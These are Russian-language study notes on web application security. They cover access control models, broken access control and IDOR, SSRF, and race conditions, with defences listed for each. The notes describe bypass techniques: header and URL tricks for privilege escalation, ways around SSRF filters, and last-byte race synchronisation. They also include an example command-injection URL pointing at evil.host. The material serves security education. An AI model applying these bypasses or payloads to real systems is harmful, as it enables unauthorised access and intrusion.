(картинка)

# Access control

Контроль доступа - эт оприменение ограничений каталельно того, кто или что имеет право выполнять действия или получать доступ к ресурсам

- Аутентификация подтверждает, что пользователь тот, за кого он себя выдаёт
- Контроль сессий принадлежность конкретных запросов к пользователю
- Контроль доступа определяет, может ли пользователь выполнить то или иное действие

Проблемы контроля доступа называются **Broken Access Control**

Модели контроля доступа - это формально определённый набор правил контроля доступа, который не зависит от тенологии или платформы реализации. Модели безопасности контроля доступа оеализуются в операционных системах, сетях, системах управления базами данных и т.д.

Основные типы включают:


### Программный контроль доступа

При программногм управлении доступом матрица привилегий пользовател...

### Дискреционный контроль доступа (DAC)

- доступ к ресурсам или функциям ограничен на основе пользователей или именованных групп пользователей. Владельцы ресурсов или функций могут назначать или делегировать права доступа пользователям. 
- Область применения: ОС, файловые системы...

### Мандатный контроль доступа (MAC)

- модель, к которой права доступа назначаются централизованно системой на основе строгих правил (с использованием меток). Пользователь не может их изменить
- Область применения: гос. и военные структуры, организации со строгими требованиями к защите данных
- Плюсы: высокая безопасность, централизованное управление
- Минусы: не гибкая...

Bell LaPadula VS BiBa (в MAC)

Bell LaPadula (конфиденциальность)
BiBa (Целостность)

Top Secret
Secret
Confidential
Unclassified

### Управление доступом на основе ролей (RBAC)

- Опрелеляются именованные роли, которым назначаются права доступа. Затем пользователям назначается одна или несколько рролей
- Область применения: подавляющее большинство бизнес приложений (ERP, CRM-системы), корпоративные сети, бд.
- Плюсы: упрощенное администрирование, принцип минимальных привилегий, соответствие структуре организации
- Минусы: не гибкая в исключениях, сложность первоначальной настройки, ...

Вздутие ролей - концепция, когда роль становится огромной, либо ролей становится гипермного

### Виды контроля доступа

- Вертикальный контроль доступа - ограничение пользователей от чувствительных данных приложения и действий, требующих более высокий уровень привилегий
- Горизонтальный контроль доступа - ограничение пользователей от данных других пользователей
- Контккстно - зависимый контроль ...

### Возможное влияние 

- Повышение привилегий в приложении: верт/гор
- Insecure Direct Object Reference (iDOR)
- Нарушение последовательности действий

### Вертикальное повышение привилегий: примеры

- Отсутствие ограничений доступа к панели администратора
- Попытка ограничения доступа на основе обфускации названий
- Контроль доступа к административной функциональности при помощи параметров, подконтрольных пользователю
- Возможность смены собственной роли (Mass Asignment - изменяя одни поля, мы можем изменить другие)
- Мисконфиг веб сервера (X-Original-URL, X-Rewrite-URL)
- Обход контроля доступа на основе метода запроса (POST -> GET)
- Обход контроля доступа путём эксплуатации разногласий интерпретации URL (/aDmiN)

### Горизонтальный elevation

- Управление идентификаторами пользователей
- Попытка ограничения доступа на основе непредсказуемых идентификаторов пользователей (напр. UUID)
- Раскрытие информации приложением

При горизонтальном повышении привилегий на пользователя с большими привилегиями будет реализовано также вертикальное повышение привилегий

### IDOR

- Тип уязвимости контроля доступа, возникающий, когда приложение использует данные, предоставленные пользователем, для прямого доступа к объектам. Подкласс BAC
- Уязвимости IDOR чаще всего связаны с горизонтальным повышением привилегий, но могут возникать и при вертикальном повышении привилегий
- В отличие от BAC, в IDOR пользователь легально имеет доступ к функциональности, но получает доступ к чужому объекту
- Устранение уязвимости строится на проверке возможности доступа пользователя к конкретному ресурсу, а не полном отключении функциональности

### Нарушение последовательнности действий

- В современных приложениях многие действия происходят по цепочке операций
- Например, подтверждение заказа администратором магазина:
	1. Получение информации по заказу
	2. Проверка и возможное изменение данных
	3. Уточнение и возможное изменение данных
	4. Выставление финального вердикта
- На первых этапах контроль доступа будет качественный почти всегда
- В остальных этапах он может быть пропущен из-за предположения о целостности последовательности действий

### Referrer-based Access Control

- Контроль доступа на основе заголовка Referrer
- Пример: приложение видит /admin/* в Referrer, значит пользователь до этого посещал раздел администратора, значит имеет право его посещать
- Очень легко обходится, но трудно детектируется черным ящиком
- Также редко встречается

### Способы тестирования приложений с большим количеством ролей

- В простых приложениях обычно существуют 2-3 различные роли
- Однако, чем сложнее приложение, тем их может быть больше: 10, 20..
- Автоматические инструменты плохо справляются с обнаружением уязвимости класса BAC
- Облегчить жизнь могут расширения Burp Suite: Authorize, Auth Analyser, AuthMatrix
- Идея в сохранении нескольких сессий и одновременная проверка запросов с использованием каждой из побочных сессий . Дальнейший анализ проводится вручную

### Защита в контроле доступа

- Не полагаться только на обфускацию при реализации контроля доступа
- Ограничивать побличный доступ к разделам до тех пор, пока это явно не потруется
- Использовать единый механизм контроля доступа на все приложение
- Четко продумывать необходимые права доступа на уровне разработки
- Ограничивать доступ по умолчанию (zero-trust идеология)
- Тщательно проводить аудит механизмов контроля доступа

#  SSRF Server side request forgery

- Open Redirect - это клиентская уязвимость, поволяющая атакующему перенаправить пользователей на произвольные ресурсы
- SSRF - это уязвимость веб-безопасности, которая позволяет злоумышленнику заставить серверное приложение отправлять запросы в непреднамеренное место

Как это может выглядеть в коде:
(code)

### Возможное влияние

- Обход контроля доступа в приложении
- Злоупотребление правами доступа внутренних сервисов
- Сканирование портов
- Чейны с другими уязвимостями (например, доставка XSS)
- Обычно имеет высокую критичность
- RCE
- DoS

### Обход контроля доступа в приложении

- производится запрос к Localhost приложения. В некоторых случаях происходит обход контроля доступа.
(картинка)

### Злоупотребление правами доступа внутренних сервисов

- Производится запрос к ip внутреннего приложения
- Обычно там выстроено доверие и запрос принимается без проблем
- Сложно обнаружить и эксплуатировать из внешней сети

### Популярные методы защиты

- Черные списки
- Белые списки
- Изменение логики
- SSRF Proxy

### Обход черных списков

- Альтернативные представления IP (+IPv6)
	- 127.0.0.1 -> 2130706433, ...
- Зарегистрировать доменное имя, указывающее на 127.0.0.1 или использовать готовые (spoofed.burpcollaborator.net)
- Обфускация символов (URL-encode, case variation): locAlHpST
- Использовать подконтрольный ресурс, перенаправляющий в нужное место (Redirect)

### Обход белых списков

- Использование формата представления УЗ: ...
- Использование символа # ...
- Регистрация доменного имени (с поддоменом): ...
- URL-encodem double URL-encode
- Использовать Open Redirect
- Использовать комбинации вышеназванных техник

### Виды SSRF

##### Видимые

- Атакующий может видеть ответ от внутреннего сервиса
- Ценится и имеет критичность выше
- При возможности нужно стремиться приводить слепую SSRF к видимой

##### Cлепые (Blind)

- Атакующий не имеет возможности видеть ответ от внутреннего сервера
- Сложнее эксплуатировать
- Ценится и имеет критичность ниже
- Можно обнаружить попыткой инициирования соединения к подконтрольному серверу
- Внешние HTTP-запросы скорее всего будут заблокированы. Можно использовать DNS и иные протоколы (FTP)
- Также можно обнаружить временными задержками

### RCE в SSRF

- Инъекция команд в URL: `http://evil.host?c='whoami'`
- Использование (древнего) протокола gopher:// (Gopherus)

### Необычные места появления SSRF

- Праметр kid в JWT
- Передача части подконтрольного URL в запросе
- Перевод в нестандартные форматы данных (-> XML -> XXE)
- Заголовок Referrer (иногда используется для аналитики)
- Поле Server Name Indication (SNI) SSL-сертификата: ...
- Рендер pdf

### Cheatsheats


# Race Conditions

- Состояние гонки - распространнный тип уязвимости, тесно связанный с недостатками бизнес логики Они возникают, когда веб приложения обрабатывают щапросы одновпеменно без релевантных мер защиты. Это может привести к одновиемененному взаимодействию нескольких отельных потоков с одними и темит же данными, что приводит к коллизии, вызывающей непреднамеренное поведение приложения. Атака на состояние гонки использует тщательно рассчитанные по времени запросы...

Race window - когда отсылаем запросы, есть миллисекундное окно, когда возможен одновременный доступ к ресурсу
Данный промежуток называется временное окно

Race conditions
- Самое разнообразное, сильно зависит от логики приложения. В наиболее интересных (но крайне редких) кейсах


Race conditions бывают:
По типу:
- Limit overrun
- ...

### Limit Overrun

- Наиболее известный тип
- Суть - произведение большого кол-ва действий, чем заложенно логикой
- Пример:
	- Использование купона на скидку
	- Перевод денег
	- ...

(картинка)

### State changes

- на протяжении своей работы приложенние часто меняет состояния
- В некоторых случаях данный процесс не заметен
	- Суть: обход состояния во время нормальной работы приложения
	- Пример: мультифакторная аутентификация

(картинка)

### Resource access

- Суть : доступ к общему ресурсу во время ...

(картинка)

### Partial construction Race conditions

- Многие приложения создают объекты в несколько этапов
- Например, создание пользователя и сущностей, принадлежащих ему в несколько SQL-ззапросов
- ...

(картинка)

### Главная проблема эксплуатации Race Conditions

(картинка)

### Методы решения

- Классические Race conditions
	- Last-byte synchronisation
	1. Происходит отправка нескольких запросов с удержанием последнего байта
	2. Последние байты всех запросов отправляются одновременно
	3. Сервер ждет окончания запросов и испытывает состояние гонки от одновременных запросов


- HTTP/2
	- Несколько запросов отправляются внутри одного

### Практическая эксплуатация

(картинка)

### Single-endpoint и Multi-endpoint Race Conditions


| Single-endpoint                                             | Multi-endpoint                                       |
| ----------------------------------------------------------- | ---------------------------------------------------- |
| - Race-запросы отправляются к одной и той же конечной точке | - Race-запросы отправляются к разным конечным точкам |
| - Требуют идеального попадания в момент времени             | - Более интуитивный сценарий                         |
| - Пример: одновременный запрос                              |                                                      |

### Варианты обхода задержек в Multi-endpoint race conditions

...


### Защита

- Избегать смешивания данных из разных источников
- Использовать механизмы уникальности (например, уникальности в БД)
- Не использовать один уровень хранения данных, чтобы обезопасить другой
- Использовать безопасные фреймворки, поддерживающие консистентность (согласованность) данных
- Если позволяет архитектура, полностью отказаться от состояния на стороне сервера